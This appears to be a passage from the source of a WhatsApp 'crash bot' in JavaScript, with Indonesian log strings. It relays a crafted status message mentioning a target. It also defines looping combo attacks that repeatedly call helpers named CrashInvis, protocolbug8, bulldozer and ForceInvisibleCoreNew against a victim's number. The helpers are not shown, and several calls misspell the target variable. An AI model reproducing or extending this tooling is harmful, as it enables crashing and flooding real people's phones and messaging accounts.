          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await kyzz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}


async function DelayInvisible(target) {
    for (let i = 0; i <= 5; i++){
    await trashprotocol(target)
    await delay(1000)
    await protocolbug8(tatget)
    await delay(1000)
    await protocolbug7(target)
    await delay(1000)
    await bulldozer(target)
    await delay(1000)
}
}
async function InvisForce(target) {
    for (let i = 0; i <= 5; i++){
    await trashdevice(target)
    await delay(1000)
    await NortInvcx(tatget)
    await delay(1000)
    await NortBlank(target)
    await delay(1000)
    await paradoxes(target)
    await delay(1000)
}
}
async function InvisibleFC(target) {
    for (let i = 0; i <= 5; i++){
    await CrashInvis(target)
    await delay(1000)
    await LocaBetanew2(target)
    await delay(1000)
    await TripXMed(target)
    await delay(1000)
    await ButtonCore(target)
    await delay(1000)
    await LocationFlowX1(target)
    await delay(1000)
    await ForceInvisibleCoreNew(target)
    await delay(1000)
}
}
async function TrashCombi(target) {
    for (let i = 0; i <= 5; i++){
    await trashprotocol(target)
    await delay(1000)
    await protocolbug8(tatget)
    await delay(1000)
    await protocolbug7(target)
    await delay(1000)
    await bulldozer(target)
    await delay(1000)
    await CrashInvis(target)
    await delay(1000)
    await LocaBetanew2(target)
    await delay(1000)
    await TripXMed(target)
    await delay(1000)
    await ButtonCore(target)
    await delay(1000)
    await LocationFlowX1(target)
    await delay(1000)
    await ForceInvisibleCoreNew(target)
    await delay(1000)
    await trashdevice(target)
    await delay(1000)
    await NortInvcx(tatget)
    await delay(1000)
    await NortBlank(target)
    await delay(1000)
}
}
//~~~~~~~~~~=~~~~~~ END FUNC ~~~===~~~~~~~~~~~~\\
// --- Jalankan Bot ---
(async () => {
console.log(chalk.redBright.bold(`
╭─────────────────────────────╮
│${chalk.white('Memulai Sesi WhatsApp...')}
╰─────────────────────────────╯
`));

startSesi();
bot.launch();
})();